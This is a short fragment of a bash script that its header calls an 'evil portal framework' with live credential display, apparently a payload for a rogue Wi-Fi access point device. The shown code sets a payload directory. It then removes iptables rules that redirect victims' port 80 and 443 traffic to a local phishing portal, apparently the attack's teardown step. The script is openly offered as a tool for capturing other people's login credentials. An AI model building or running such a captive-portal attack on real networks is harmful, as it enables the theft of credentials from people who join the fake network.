#!/bin/bash
# Title: JackPoint
# Description: Evil portal framework with portal picker and live credential display
# Author: wickedNull
# Version: 1.0
# Category: Attacks

PAYLOAD_DIR="/root/payloads/user/attacks/jackpoint"
...
iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 80  -j DNAT --to-destination "$AP_IP:8080" 2>/dev/null
iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j DNAT --to-destination "$AP_IP:8080" 2>/dev/null
iptables -t nat -D POSTROUTING -s "$AP_SUBNET/24" -j MASQUERADE 2>/dev/null
